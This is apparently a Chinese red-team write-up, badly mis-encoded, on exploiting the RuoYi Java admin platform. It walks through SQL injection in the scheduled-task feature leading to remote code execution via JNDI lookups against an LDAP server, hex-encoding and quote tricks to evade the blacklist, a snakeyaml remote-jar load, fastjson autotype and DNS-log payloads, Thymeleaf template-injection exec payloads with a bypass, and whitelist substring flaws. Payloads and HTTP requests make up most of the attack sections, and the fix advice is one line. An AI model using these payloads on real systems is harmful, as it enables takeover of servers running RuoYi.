RuoYi æ˜¯ä¸€ä¸ª Java EE ä¼ä¸šçº§å¿«é€Ÿå¼€å‘å¹³å°ï¼ŒåŸºäºç»å…¸æŠ€æœ¯ç»„åˆï¼ˆSpring Bootã€Apache Shiroã€MyBatisã€Thymeleafã€Bootstrapï¼‰ï¼Œå†…ç½®æ¨¡å—å¦‚ï¼šéƒ¨é—¨ç®¡ç†ã€è§’è‰²ç”¨æˆ·ã€èœå•åŠæŒ‰é’®æˆæƒã€æ•°æ®æƒé™ã€ç³»ç»Ÿå‚æ•°ã€æ—¥å¿—ç®¡ç†ã€é€šçŸ¥å…¬å‘Šç­‰ã€‚åœ¨çº¿å®šæ—¶ä»»åŠ¡é…ç½®ï¼›æ”¯æŒé›†ç¾¤ï¼Œæ”¯æŒå¤šæ•°æ®æºï¼Œæ”¯æŒåˆ†å¸ƒå¼äº‹åŠ¡ã€‚  
## 0x02 æ¼æ´æ¦‚è¿°  
  
è‹¥ä¾æœ€æ–°åå°å®šæ—¶ä»»åŠ¡SQLæ³¨å…¥å¯å¯¼è‡´RCEæ¼æ´  
## 0x03 å½±å“ç‰ˆæœ¬  
  
v4.7.8  
## 0x04 ç¯å¢ƒæ­å»º  
- RuoYi å®˜ç½‘åœ°å€ï¼šhttp://ruoyi.vip(opens new window)  
  
- RuoYi åœ¨çº¿æ–‡æ¡£ï¼šhttp://doc.ruoyi.vip(opens new window)  
  
- RuoYi æºç ä¸‹è½½ï¼šhttps://gitee.com/y_project/RuoYi(opens new window)  
  
ä½¿ç”¨phpstudyå¯åŠ¨mysql  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoiced4VbY4bbV0lOC1K0VAEHlTFrhwIDC6Wp1bkIUZA5JFs3jYTuSGQZw/640?wx_fmt=png&from=appmsg "")  
  
åˆ›å»ºæ•°æ®åº“
```
ry
```

  
å¯¼å…¥sqlåˆ°ryæ•°æ®åº“ä¸­  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicT1P4ybDgCKJficl9nsHedNQf5yXPLKF4BZ04iaWvWYzaiaYP5z7yZ4PicQ/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicJooUFibQ1x0XiauF1DK4e7uPEuPag4iaeqjujDBTILqiaXWrjHCkiaMHclg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicBib6ibQ0ONSa8j7QhDQY4g8iaAPw8z7ppAF7UgWicv1HZfRrtayGzTYoAg/640?wx_fmt=png&from=appmsg "")  
  
å°†ruoyi-adminä¸‹çš„application-druid.ymlæ–‡ä»¶é…ç½®æ•°æ®åº“è´¦å·å¯†ç   
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicKFhmaFy5XGkvTiczqXk1icK4ibiaJwBwVLafmIxHxUXhAiaYMfibpl7lT4mw/640?wx_fmt=png&from=appmsg "")  
  
å¯åŠ¨æˆåŠŸ  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicr66X19HmiaIGkPW6cG6mbMcpia1ibcycFmDx7OXsvfeDO9x1RAEVvMQaQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
è‹¥ä¾æ¼æ´å¤ç°ç¯å¢ƒæ­å»ºæˆåŠŸ  

```
admin
admin123

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicNbiacFRqkqArnr51A4FEco1yxLAuLjpaFpicIbbtTHRm5gAEib6937kKA/640?wx_fmt=png&from=appmsg "")  
## 0x05 æ¼æ´å¤ç°  
  
ç³»ç»Ÿç›‘æ§ä¸‹å®šæ—¶ä»»åŠ¡ä¸­å­˜åœ¨SQLæ³¨å…¥æ¼æ´  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicHOJ2Nl7a8Z74icyMqs3CahnJ95aU4o1D0iaJWCeo6j8yicRyKkhEgWGSg/640?wx_fmt=png&from=appmsg "")  
  
åœ¨è¡¥ä¸ä¸­ï¼Œä½¿ç”¨äº†é»‘åå•å’Œç™½åå•çš„ç­–ç•¥ã€‚  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicK5x7ibyicVcIyv3GeiaeD8kuIOicEiafFHflLsSAdeCsCAkcia0PjrqIbFyA/640?wx_fmt=png&from=appmsg "")  
  
SQLæ³¨å…¥æ¼æ´ç‚¹  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicpjILPPqbLfFgcEJz9JlqN8NvhBSdCVYdza2me50decIljsr0q8WGJg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
å¼€å§‹å¤ç°  
RCE payload  
JNDI  

```
javax.naming.InitialContext.lookup('ldap://127.0.0.1:1389/deserialJackson')

```

  
payloadä¸­å¯ä»¥æ‰§è¡Œåå¼¹shellã€æ¼æ´æ¢æµ‹ã€å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½  
DNSLOG  

```
javax.naming.InitialContext.lookup('ldap://dnslog')

```

  
ç›®æ ‡å­—ç¬¦ä¸²ä¸å…è®¸'ldap(s)'è°ƒç”¨ä¸”ä¸èƒ½å­˜åœ¨æ‹¬å·ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨SQLæ³¨å…¥åŠ åå…­è¿›åˆ¶ç¼–ç æ¥è¿›è¡Œç»•è¿‡ä¿®æ”¹  
https://www.bejson.com/convert/ox2str/  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicODhm1nFWseX7RpeoKo30Yj6TNBib1mnEOh6tSkBiaDWa3x8ADJbnZ2SQ/640?wx_fmt=png&from=appmsg "")  

```
6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729

```

  
ç¬¬ä¸€æ­¥ï¼šè¿è¡Œæ­¤å‘½ä»¤  
æˆåŠŸåœ°ç»•è¿‡äº†å®ƒï¼Œå¹¶æˆåŠŸåœ°æ‰§è¡Œ  

```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack ByÂ 1ue' WHERE job_id = 1;')

```

  
<table><thead><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1.11111px solid rgb(216, 222, 228);"><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf=""><br/></span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1.11111px solid rgb(216, 222, 228);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">åˆ†é’Ÿ</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">å°æ—¶</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">æ—¥</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">æœˆ</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">æ˜ŸæœŸ</span></section></td></tr></tbody></table>  

```
* * * * * ?

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic7GfP3orjDbAI3YiaJl3SyoZmsaYsM8nvdl0jXAXxkGOnqlrFlicDujuw/640?wx_fmt=png&from=appmsg "")  
  
ç¬¬äºŒæ­¥ï¼š  
ä¿®æ”¹æ‰§è¡Œå‘½ä»¤  

```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack ByÂ 1ue' WHERE job_id = 1;')

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicP4PoyicuOYibat8X2atMIrGzjt9NqSVzyl7mOXS4I4cakhLC3vloBjAA/640?wx_fmt=png&from=appmsg "")  
  
ç¬¬ä¸‰æ­¥ï¼š  

```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729 WHERE job_id = 1;')

```

  
åˆ›å»ºä»»åŠ¡  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicp84VbdDFJCa4SsegUGvUvs09ZlBPyXofPxKsGeZhB28RsEzU3upORg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
æ‰§è¡Œä¸€æ¬¡  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicvzpBlR9rHZJeBiaBjo7FTNHNTjr0PL13ia10yChNk7V0HM39MCEWiaNIg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
æ‰§è¡Œè¢«ä¿®æ”¹çš„ä»»åŠ¡ä¹‹å‰éœ€è¦å¼€å¯JNDI  
éœ€è¦ä¸‹è½½cckuailongå¸ˆå‚…çš„JNDI-Injection-Exploit-Plusé¡¹ç›®(https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/releases/tag/2.3)ã€‚  
jdkç‰ˆæœ¬è¦æ±‚1.8  

```
java -jarÂ '.\JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar'Â -C calc -AÂ 127.0.0.1

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicib94HORgaVAmJibTvrcwaiaplxqIkcLP4eTHRkaOqbVAmJSiaWvFEaxyicw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
æ‰§è¡Œè¢«ä¿®æ”¹çš„1ä»»åŠ¡  
JNDI  

```
javax.naming.InitialContext.lookup('ldap://127.0.0.1:1389/deserialJackson')

```

  
payloadä¸­å¯ä»¥æ‰§è¡Œåå¼¹shellã€æ¼æ´æ¢æµ‹ã€å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½  
DNSLOG  

```
javax.naming.InitialContext.lookup('ldap://dnslog')

```

  
ç›®æ ‡å­—ç¬¦ä¸²ä¸å…è®¸'ldap(s)'è°ƒç”¨ä¸”ä¸èƒ½å­˜åœ¨æ‹¬å·ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨SQLæ³¨å…¥åŠ åå…­è¿›åˆ¶ç¼–ç æ¥è¿›è¡Œç»•è¿‡ä¿®æ”¹  
https://www.bejson.com/convert/ox2str/  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicODhm1nFWseX7RpeoKo30Yj6TNBib1mnEOh6tSkBiaDWa3x8ADJbnZ2SQ/640?wx_fmt=png&from=appmsg "")  

```
0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f7263793870732e646e736c6f672e636e2729

```


```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729 WHERE job_id = 1;')

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicXZGoOib4r8HTSbdTBqsVsFeURpKHk8NhQHtYrn3627dODeZrA3Bib4Sg/640?wx_fmt=png&from=appmsg "")  
  
æˆ‘ä»¬å†æ¥è¯•è¯•dnslog  

```
javax.naming.InitialContext.lookup('ldap://rcy8ps.dnslog.cn')

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicste74ZeR7yExbI8RMmWUPDuc6icf2e14bVHZuQ4V7ozISS6JeOw9Mfw/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicFIuPd85LNswgVl4ibPwuLJsOQl0qO84PBbGaibIOJrNhiasxkvK8egvXg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicaQ5gzGHTlPI7qicZlZF7XBG7ghzpKq17o2995djjCXFm17ibRJwua3PA/640?wx_fmt=png&from=appmsg "")  
  
å·¥å…·ä½¿ç”¨ï¼š  
https://github.com/charonlight/RuoYiExploitGUI  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicXsADiaZOMECMLATxSrficicCicw5p4Ma9zoNtdTK2g90KrlM3sL2tvVcTw/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicv1ro5A9gRT9kE9LmYtsnccV19ZmkeXQMxHae6oia9SCxI1BqXHbuc7w/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicV3nrGMBmK6ibraFB4LOfXofgJQr55gok3I1hdk8Qnn3mMt7NpSbIMIw/640?wx_fmt=png&from=appmsg "")  
## 0x06 ä¿®å¤æ–¹å¼  
  
1ã€å‡çº§ç‰ˆæœ¬ã€‚  
## 0x07 bypass  
### ç‰ˆæœ¬4.6.2<=Ruoyi<4.7.2  
  
è¿™ä¸ªç‰ˆæœ¬é‡‡ç”¨äº†é»‘åå•é™åˆ¶è°ƒç”¨å­—ç¬¦ä¸²  
- å®šæ—¶ä»»åŠ¡å±è”½ldapè¿œç¨‹è°ƒç”¨  
  
- å®šæ—¶ä»»åŠ¡å±è”½http(s)è¿œç¨‹è°ƒç”¨  
  
- å®šæ—¶ä»»åŠ¡å±è”½rmiè¿œç¨‹è°ƒç”¨  
  
**Bypass**  
å’±ä»¬åªéœ€è¦åœ¨å±è”½çš„åè®®åŠ ä¸Šå•å¼•å·,æ¥ç€é‡‡ç”¨ä¹‹å‰çš„æ–¹å¼ä¾‹å¦‚:  

```
org.yaml.snakeyaml.Yaml.load(â€™!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [â€œ**hâ€™tâ€™tâ€™pâ€™:**//127.0.0.1:88/yaml-payload.jarâ€]]]]â€™)

```

# 0x07 fastjsonååºåˆ—åŒ–  
  
å…³æ³¨ä¸¤ä¸ªå‡½æ•° parse å’Œ parseObject JSONObject.parse  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicNcjosiaNQKic6wdn2Y3iaj7yyJl90iaMju7W8rhOL5TtlibSTCUm6UcZtbg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicu5Uedr4yrujUOPMgLnl1Xlib1iax3NNVKUoEWA07gmgVzQGwj784iattg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicsXng3uWQEgYvVGIcMuVXLPpJjbHRDHElrXvoKic2ZTUsrBTuRIy0mdg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
å¼€å¯ autotype  

```
params[@type]=org.apache.shiro.jndi.JndiObjectFactory&params[resourceName]=ldap://192.168.12.76:1389/09rlhv

```

## ruoyi4.2.0  
  
åˆçœ‹è¿™ä¸ªæ•°æ®åŒ…ä¸€å †å‚æ•°ï¼Œæœ‰ç‚¹å¤æ‚ï¼Œæ ¹æ®ä¹‹å‰çš„åˆ†ææ¢³ç†ä¸€ä¸‹ï¼Œéœ€è¦çš„å‚æ•°æ˜¯Â 
```
tplCategory
```

  
ä¸º
```
tree
```

  
ï¼Œæ‰èƒ½èµ°åˆ°
```
fastjsonæ¼æ´ç‚¹
```

  
,è®¤çœŸæ¢³ç†ä¸€ä¸‹éœ€è¦çš„å‚æ•°ï¼Œå‘ç°è¿˜éœ€è¦
```
treeCode&treeParentCode
```

  
å‚æ•°ï¼Œè¿™å—ä»£ç ä¸­å…¨å±€æœç´¢æç¤ºçš„ç¼ºå°‘çš„å†…å®¹çš„ä¸­æ–‡åç§°å³å¯å‘ç°å‚æ•°åç§°ï¼Œå¡«å†™ä¸Šå³å¯ã€‚  
  
æœ€ç»ˆç®€åŒ–åçš„æ•°æ®åŒ…å¦‚ä¸‹  

```
POST /tool/gen/edit HTTP/1.1
Host:Â 172.16.0.66
User-Agent: Mozilla/5.0Â (Windows NTÂ 10.0; Win64; x64) AppleWebKit/537.36Â (KHTML, like Gecko) Chrome/129.0.0.0Â Safari/537.36
Referer: http://172.16.0.66/tool/gen/edit/6
Cookie: JSESSIONID=c229803b-e147-4853-ae79-df7e04dcd338
X-Requested-With: XMLHttpRequest
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://172.16.0.66
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 3610

tableName=111111&tableComment=111111&className=111111&functionAuthor=111111&&columns[0].javaType=Long&columns[0].javaField=infoId&&tplCategory=tree&treeCode=111111&treeParentCode=111111&packageName=111111&moduleName=111111&businessName=111111&functionName=111111&params[treeCode]=111111&params[treeParentCode]=1&params[treeName]={&#34;@type&#34;:&#34;java.net.Inet4Address&#34;,&#34;val&#34;:&#34;11.hb4r0s.dnslog.cn&#34;}

```

# 0x08 SSTIæ¨¡ç‰ˆæ³¨å…¥æ¼æ´  
#### æ¼æ´ç‰ˆæœ¬  
  
åœ¨4.7.1ç‰ˆæœ¬CacheControllerç±»ä¸­  
![[../S24-25èµ›å­£-å¤§é»‘å®¢ä¹‹è·¯/çº¢é˜ŸçŸ¥è¯†å­¦ä¹ /assets/Y10 è‹¥ä¾ruoyi/file-20250416135654610.png]]  
#### æ¼æ´å¤ç°  
  
æ¨¡æ¿æ³¨å…¥æ¼æ´payloadï¼š  
  
returnå†…å®¹å¯æ§ï¼š  

```
${newÂ java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&#34;calc&#34;).getInputStream()).next()}::.x

```

  
URLè·¯å¾„å¯æ§ï¼š  

```
${T(java.lang.Runtime).getRuntime().exec(&#34;touch test&#34;)}::.x

```

  
æµ‹è¯•ä¸Šè¿°payloadå‘ç°è¿”å›åŒ…è¿”å›500ï¼Œå…·ä½“æƒ…å†µæ˜¯
```
Thymeleaf3.0.12
```

  
ç‰ˆæœ¬å¯¹è¿™ä¸ªç‰ˆæœ¬è¿›è¡Œäº†ä¸€äº›å…ˆçŸ¥ï¼Œé˜²æ­¢æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œ
```
https://github.com/thymeleaf/thymeleaf/issues/809
```

  
ä»¥ä¸‹ä¸ºé˜²æŠ¤çš„æƒ…å†µï¼š  
  
æˆ‘ä»¬å°†Payloadæ”¹é€ ä¸€ä¸‹ï¼Œå¦‚
```
${T (java.lang.Runtime).getRuntime().exec(&#34;calc.exe&#34;)}
```

  
ã€‚åœ¨Tå’Œ(ä¹‹é—´å¤šåŠ å‡ ä¸ªç©ºæ ¼å³å¯ï¼Œæ”¾å…¥æ•°æ®åŒ…ä¸­è¿›è¡Œæµ‹è¯•å‘ç°æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚  
  
è¿™é‡Œä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œ
```
payload
```

  
ç›´æ¥è´´å‡ºæ¥äº†ï¼Œå¤§å®¶æµ‹è¯•çš„æ—¶å€™è®°å¾—è¿›è¡Œ
```
URL
```

  
ç¼–ç ã€‚  

```
POST /monitor/cache/getNames HTTP/1.1

fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open -a calculator')}__::.x

```


```
cacheName=123&fragment=${T (java.lang.Runtime).getRuntime().exec(â€œcalc.exeâ€)}

```

#### æ¥å£/monitor/cache/getKeys  
#### æ¥å£/monitor/cache/getValue  
#### æ¥å£/demo/form/localrefresh/task  
# 0x09 è‹¥ä¾4.8.0ç‰ˆæœ¬è®¡åˆ’ä»»åŠ¡RCE  
### ç¯å¢ƒæ­å»º  
  
https://github.com/yangzongzhuan/RuoYi/releases  
  
å¯¼å…¥æ•°æ®åº“ï¼Œä¿®æ”¹application-druidä¸­çš„æ•°æ®åº“è´¦å·å¯†ç   
  
ä¿®æ”¹applicationä¸­çš„æ–‡ä»¶è·¯å¾„åŠlogå­˜æ”¾è·¯å¾„  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicqdnSx8DWiatrY9pTroMGXwlI6C9uDqN9EXNicnItuEvkOMbkc8piarPJg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoichf7zNJfsYQr84yFyygmFayc1ich5ibkxuViaNqy7pg76JL11FJqJ5ibTcQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
å¯åŠ¨æˆåŠŸ  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicznTRZeAib1xOMpm3LiaoXBHAOURNRz4WY4LtdQMwHAVaCZm5kBOSEX4g/640?wx_fmt=png&from=appmsg "")  
## æ¼æ´åˆ†æ  
  
æœ€æ–°ç‰ˆæœ¬4.8 Ruoyi åå°â½¬å‰é™åˆ¶  
- **è§„åˆ™**  
ï¼š
```
invokeTarget
```

  
Â å¿…é¡»åŒ…å«Â 
```
com.ruoyi.quartz.task
```

  
Â å­—ç¬¦ä¸²ã€‚  
  
-   
- **å­å­—ç¬¦ä¸²åŒ¹é…æ¼æ´**  
ï¼šç™½åå•æ£€æŸ¥ä½¿ç”¨Â 
```
StringUtils.containsAnyIgnoreCase
```

  
ï¼Œåªè¦Â 
```
invokeTarget
```

  
Â ä¸­**ä»»æ„ä½ç½®**  
åŒ…å«ç™½åå•å­—ç¬¦ä¸²å³å¯ï¼Œæ— éœ€å®Œå…¨åŒ¹é…åŒ…åã€‚  
  
- **æ„é€ ç•¸å½¢ç±»å**  
ï¼šä¾‹å¦‚Â 
```
xxx.com.ruoyi.quartz.task.yyy.EvilClass
```

  
ï¼Œè™½ç„¶å®é™…åŒ…åä¸åœ¨ç™½åå•å†…ï¼Œä½†å­—ç¬¦ä¸²åŒ…å«Â 
```
com.ruoyi.quartz.task
```

  
ï¼Œå¯ç»•è¿‡ç™½åå•ã€‚  
  
- **ç»•è¿‡æ€è·¯**  
ï¼š  
  

```
/** Â 
Â  Â  Â * å®šæ—¶ä»»åŠ¡ç™½åå•é…ç½®ï¼ˆä»…å…è®¸è®¿é—®çš„åŒ…åï¼Œå¦‚å…¶ä»–éœ€è¦å¯ä»¥è‡ªè¡Œæ·»åŠ ï¼‰ Â 
Â  Â  Â */
publicstaticfinalString[] JOB_WHITELIST_STR = {Â &#34;com.ruoyi.quartz.task&#34;Â }; Â 

/** Â 
Â  Â  Â * å®šæ—¶ä»»åŠ¡è¿è§„çš„å­—ç¬¦ Â 
Â  Â  Â */
publicstaticfinalString[] JOB_ERROR_STR = {Â &#34;java.net.URL&#34;,Â &#34;javax.naming.InitialContext&#34;,Â &#34;org.yaml.snakeyaml&#34;, Â 
&#34;org.springframework&#34;,Â &#34;org.apache&#34;,Â &#34;com.ruoyi.common.utils.file&#34;,Â &#34;com.ruoyi.common.config&#34;,Â &#34;com.ruoyi.generator&#34;Â }; Â 
}

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicsnOVc70bLgcWlcibDW1KLCXwKNibsSkI7Qqz19Z9Za6X6dMfFKL6NeuQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
JOB_WHITELIST_STR è¿™ä¸ªä¹Ÿå°±æ˜¯com.ruoyi.quartz.task å…¶å®ä¸â½¤ç±»å åŒ…å«åœ¨â¾ƒç¬¦ä¸²â¾¥â¾¯å°±â¾ è¿™â¾¥æ˜¯invokeTargetâ½½ä¸æ˜¯beanPackageName  
- **è§„åˆ™**  
ï¼šç¦æ­¢ä½¿ç”¨Â 
```
java.net.URL
```

  
ã€
```
org.springframework
```

  
Â ç­‰æ•æ„ŸåŒ…ä¸‹çš„ç±»ã€‚  
  
-   
- **å¯»æ‰¾éé»‘åå•ç±»**  
ï¼šåˆ©ç”¨è‹¥ä¾è‡ªèº«ä¾èµ–æˆ–ç¬¬ä¸‰æ–¹åº“ä¸­æœªè¢«é»‘åå•è¦†ç›–çš„ç±»ã€‚ä¾‹å¦‚ï¼š  
  
- **å·¥å…·ç±»**  
ï¼šè‹¥ä¾çš„Â 
```
com.ruoyi.common.utils
```

  
Â ä¸‹çš„æŸäº›å·¥å…·ç±»ï¼ˆéœ€ç¡®è®¤æ˜¯å¦åœ¨Â 
```
JOB_ERROR_STR
```

  
Â ç¦æ­¢çš„å­åŒ…ä¸­ï¼‰ã€‚  
  
- **ç»•è¿‡æ€è·¯**  
ï¼š  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicvjw7XdOVBWTKict4oBK356l5UBmia6YEamcW9QoZfIOHWGvFsm1IW95g/640?wx_fmt=png&from=appmsg "")  
  
**ç™½åå•æ£€æŸ¥ï¼ˆwhiteListÂ æ–¹æ³•ï¼‰**  

```
publicstaticbooleanÂ whiteList(StringÂ invokeTarget) Â 
Â  Â  { Â 
StringÂ packageName = StringUtils.substringBefore(invokeTarget,Â &#34;(&#34;); Â 
intÂ count = StringUtils.countMatches(packageName,Â &#34;.&#34;); Â 
ifÂ (count >Â 1) Â 
Â  Â  Â  Â  { Â 
returnÂ StringUtils.containsAnyIgnoreCase(invokeTarget, Constants.JOB_WHITELIST_STR); Â 
Â  Â  Â  Â  } Â 
ObjectÂ obj = SpringUtils.getBean(StringUtils.split(invokeTarget,Â &#34;.&#34;)[0]); Â 
StringÂ beanPackageName = obj.getClass().getPackage().getName(); Â 
returnÂ StringUtils.containsAnyIgnoreCase(beanPackageName, Constants.JOB_WHITELIST_STR) Â 
Â  Â  Â  Â  Â  Â  Â  Â  && !StringUtils.containsAnyIgnoreCase(beanPackageName, Constants.JOB_ERROR_STR); Â 
Â  Â  } Â 
}

```

- **æ¼æ´ç‚¹**  
ï¼šå½“Â 
```
invokeTarget
```

  
Â çš„åŒ…å±‚çº§è¶…è¿‡1å±‚æ—¶ï¼ˆå¦‚Â 
```
a.b.c.method
```

  
ï¼‰ï¼Œä»…æ£€æŸ¥æ˜¯å¦åŒ…å«ç™½åå•å­—ç¬¦ä¸²ï¼Œè€Œéå®Œæ•´åŒ…è·¯å¾„ã€‚  
  
